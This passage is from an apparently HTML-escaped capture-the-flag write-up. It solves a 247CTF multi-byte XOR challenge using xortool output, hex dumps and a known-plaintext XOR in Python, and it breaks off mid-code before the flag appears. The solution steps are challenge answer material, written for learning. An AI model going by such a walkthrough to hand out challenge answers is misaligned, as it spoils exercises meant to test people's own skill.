&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;00000080: 5e4b &lt;span class=&#34;m&#34;&gt;5113&lt;/span&gt; 5b41 165c 5d0c &lt;span class=&#34;m&#34;&gt;5743&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;5851&lt;/span&gt; 0b45  ^KQ.&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;A.&lt;span class=&#34;se&#34;&gt;\]&lt;/span&gt;.WCXQ.E
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;00000090: &lt;span class=&#34;m&#34;&gt;1751&lt;/span&gt; 5c55 160e 000d &lt;span class=&#34;m&#34;&gt;4627&lt;/span&gt; 585d 0b51 &lt;span class=&#34;m&#34;&gt;5909&lt;/span&gt;  .Q&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;....F&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;X&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;.QY.
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;solution&#34;&gt;Solution&lt;/h2&gt;
&lt;p&gt;If we Google a bit, we encounter an amazing tool to analyze multi-byte xor cipher called &lt;a href=&#34;https://github.com/hellman/xortool&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;xortool&lt;/a&gt; able to:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;guess the key length (based on count of equal chars)&lt;/li&gt;
&lt;li&gt;guess the key (base on knowledge of most frequent char)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;If we run the tool with default settings, it outputs the following results:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ xortool exclusive_key
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;The most probable key lengths:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    2:   13.4%
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    4:   13.7%
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    8:   13.4%
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    10:   11.9%
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    12:   9.4%
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    16:   9.1%
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    18:   6.4%
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    20:   9.4%
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    24:   6.5%
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    40:   7.0%
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Key-length can be 4*n
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Most possible char is needed to guess the key!
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Well, better than nothing. We can specify the most possible character with &lt;code&gt;-c&lt;/code&gt; option, usually is &lt;code&gt;0x00&lt;/code&gt; (null-byte) for binary data and &lt;code&gt;0x20&lt;/code&gt; (whitespace) for text data. If we try either of the two, we obtain a similar result:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ xortool exclusive_key -c &lt;span class=&#34;s2&#34;&gt;&amp;#34;0x00&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;The most probable key lengths:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    2:   13.4%
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    4:   13.7%
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    8:   13.4%
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    10:   11.9%
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    12:   9.4%
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    16:   9.1%
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    18:   6.4%
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    20:   9.4%
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    24:   6.5%
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    40:   7.0%
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Key-length can be 4*n
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; possible key&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;s&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; of length 4:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;][&lt;/span&gt;_
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Found &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; plaintexts with 95%+ valid characters
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;See files filename-key.csv, filename-char_used-perc_valid.csv
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The tool will create the folder xortool_out with three files in this case:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;0.out&lt;/strong&gt;: decrypted file with guessed xor key.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;filename-char_used-perc_valid.csv&lt;/strong&gt;: list of most frequent char used for every file (in case of many) and percentage of valid characters in the decrypted file.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;filename-key.csv&lt;/strong&gt;: list of key used for every file.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Unfortunately, the resulting file doesn&amp;rsquo;t seem to have been decrypted right:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ xxd xortool_out/0.out &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; head
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;00000000: &lt;span class=&#34;m&#34;&gt;5248&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;2853&lt;/span&gt; 4b4f 796c 7b45 014a &lt;span class=&#34;m&#34;&gt;0300&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0737&lt;/span&gt;  RH&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SKOyl&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;E.J...7
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;00000010: &lt;span class=&#34;m&#34;&gt;5956&lt;/span&gt; 1b04 &lt;span class=&#34;m&#34;&gt;0549&lt;/span&gt; 5d02 041b 1b54 1d5d &lt;span class=&#34;m&#34;&gt;5255&lt;/span&gt;  YV...I&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;....T.&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;RU
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;00000020: 0b51 1b4a &lt;span class=&#34;m&#34;&gt;5406&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0651&lt;/span&gt; 4c49 007d 667c 1d1e  .Q.JT..QLI.&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;f&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;..
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;00000030: 5b0b 4b1e 0a05 4b00 &lt;span class=&#34;m&#34;&gt;4752&lt;/span&gt; 1b1b 4b57 &lt;span class=&#34;m&#34;&gt;3452&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;.K...K.GR..KW4R
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;00000040: 0d0d 090d &lt;span class=&#34;m&#34;&gt;0134&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0251&lt;/span&gt; 0b4b 0e47 &lt;span class=&#34;m&#34;&gt;5901&lt;/span&gt; 0d50  .....4.Q.K.GY..P
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;00000050: 1d0c &lt;span class=&#34;m&#34;&gt;1821&lt;/span&gt; 2a4e 747a 135d 4b11 &lt;span class=&#34;m&#34;&gt;5066&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0549&lt;/span&gt;  ...!*Ntz.&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;K.Pf.I
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;00000060: 0c4a 030c &lt;span class=&#34;m&#34;&gt;5721&lt;/span&gt; 5f0d 0e0d 1a49 121e &lt;span class=&#34;m&#34;&gt;6955&lt;/span&gt;  .J..W!_....I..iU
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;00000070: &lt;span class=&#34;m&#34;&gt;0556&lt;/span&gt; 1f02 5e00 0d1e 411d &lt;span class=&#34;m&#34;&gt;0568&lt;/span&gt; 647e 1e36  .V..^...A..hd~.6
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;00000080: &lt;span class=&#34;m&#34;&gt;0216&lt;/span&gt; 0a4c 071c 4d03 &lt;span class=&#34;m&#34;&gt;0151&lt;/span&gt; 0c1c 040c 501a  ...L..M..Q....P.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;00000090: 4b0c 070a 4a53 5b52 1a7a &lt;span class=&#34;m&#34;&gt;0302&lt;/span&gt; 570c &lt;span class=&#34;m&#34;&gt;0256&lt;/span&gt;  K...JS&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;R.z..W..V
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;So, we can try to bruteforce the key. The tools counts with &lt;code&gt;-b&lt;/code&gt; option to brute force all possible most frequent chars, or &lt;code&gt;-o&lt;/code&gt; to constraint search to printable chars. If we try to run either of two options, we get a bunch of files with no sense at all. But, if we use &lt;code&gt;-m&lt;/code&gt; option to specify a longer key, we obtain a more promising result:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ xortool exclusive_key -o -m &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;The most probable key lengths:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    2:   9.5%
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    4:   10.2%
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    8:   11.4%
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    10:   10.8%
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    12:   9.1%
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    16:   9.9%
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    20:   11.3%
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    24:   8.5%
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    30:   7.5%
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    40:   11.8%
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Key-length can be 4*n
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;100&lt;/span&gt; possible key&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;s&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; of length 40:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;gab\x16\x01\x13.67mg4kd77l:ac`a0dl`#c6606gram3ab(
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;f&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;c&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;17&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;00&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;12/76lf5je66m&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;ba&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;1ema&lt;span class=&#34;s2&#34;&gt;&amp;#34;b7717fs`l2`c)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#39;ec`\x14\x03\x11,45oe6if55n8cabc2fnb!a4424epco1c`*
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#39;dba\x15\x02\x10-54nd7hg44o9b`cb3goc `5535dqbn0ba+
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;cef&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;12&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;05&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;17*23ic0o&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;33h&amp;gt;egde4&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;hd&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;g2242cvei7ef,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;...
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Found &lt;span class=&#34;m&#34;&gt;35&lt;/span&gt; plaintexts with 95%+ valid characters
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;See files filename-key.csv, filename-char_used-perc_valid.csv
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;35 plaintext!&lt;/strong&gt; If we carefully examine the 99 resulting files, we can spot an almost decrypted HTML file of &lt;a href=&#34;https://en.wikipedia.org/wiki/Hacker&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Wikipedia&amp;rsquo;s hacker entry&lt;/a&gt; in &lt;code&gt;14.out&lt;/code&gt; file:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ xxd xortool_out/14.out &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; head
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;00000000: 3c21 444f &lt;span class=&#34;m&#34;&gt;4354&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;5950&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;4520&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;6874&lt;/span&gt; 616c 3e0a  &amp;lt;!DOCTYPE htal&amp;gt;.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;00000010: 3c64 746d 6c20 636c &lt;span class=&#34;m&#34;&gt;6173&lt;/span&gt; 363d &lt;span class=&#34;m&#34;&gt;2263&lt;/span&gt; 6c69  &amp;lt;dtml &lt;span class=&#34;nv&#34;&gt;clas6&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;cli
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;00000020: 652b 742d 6e6f 6a73 2220 6c61 6e67 3d22  e+t-nojs&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;lang&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;00000030: 656e 2220 6869 723d 2260 7472 223e 0a3c  en&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;hir&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;`tr&amp;#34;&lt;/span&gt;&amp;gt;.&amp;lt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;00000040: &lt;span class=&#34;m&#34;&gt;6865&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;2464&lt;/span&gt; 3e0a 3c6d &lt;span class=&#34;m&#34;&gt;6531&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;6120&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;6368&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;6172&lt;/span&gt;  he&lt;span class=&#34;nv&#34;&gt;$d&lt;/span&gt;&amp;gt;.&amp;lt;me1a char
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;00000050: &lt;span class=&#34;m&#34;&gt;7365&lt;/span&gt; 743d &lt;span class=&#34;m&#34;&gt;2255&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;5446&lt;/span&gt; 2d38 222f 320a 3c74  &lt;span class=&#34;nv&#34;&gt;set&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;UTF-8&amp;#34;&lt;/span&gt;/2.&amp;lt;t
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;00000060: &lt;span class=&#34;m&#34;&gt;6978&lt;/span&gt; 6c65 3e48 &lt;span class=&#34;m&#34;&gt;6163&lt;/span&gt; 6b65 &lt;span class=&#34;m&#34;&gt;3720&lt;/span&gt; 2d20 &lt;span class=&#34;m&#34;&gt;5769&lt;/span&gt;  ixle&amp;gt;Hacke7 - Wi
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;00000070: 6b2c &lt;span class=&#34;m&#34;&gt;7065&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;6469&lt;/span&gt; 613c 2f74 &lt;span class=&#34;m&#34;&gt;6974&lt;/span&gt; 6c65 3e0a  k,pedia&amp;lt;/title&amp;gt;.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;00000080: 3c73 &lt;span class=&#34;m&#34;&gt;6372&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;6570&lt;/span&gt; 743e &lt;span class=&#34;m&#34;&gt;6463&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;6375&lt;/span&gt; 6d65 6e74  &amp;lt;scrept&amp;gt;dccument
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;00000090: 2e64 2a63 756d 656e &lt;span class=&#34;m&#34;&gt;7400&lt;/span&gt; 6c65 6d65 6e74  .d*cument.lement
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;And if we examine the key used for that file, we can see that it follows the &lt;strong&gt;flag structure &lt;code&gt;247CTF{XXX}&lt;/code&gt;&lt;/strong&gt;, but it contains some bytes out of the md5 hexstring hash range (&lt;code&gt;[a-f0-9]&lt;/code&gt;). As we already know both the cipher and plain text, we can xor them to obtain the right key:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;In&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]:&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;with&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Hacker - Wikipedia.html&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;rb&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;...&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;     &lt;span class=&#34;n&#34;&gt;plain&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;read&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;...&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;In&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]:&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;with&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;exclusive_key&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;rb&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;...&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;     &lt;span class=&#34;n&#34;&gt;cipher&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;read&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;...&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;In&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]:&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;join&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;([&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;chr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span 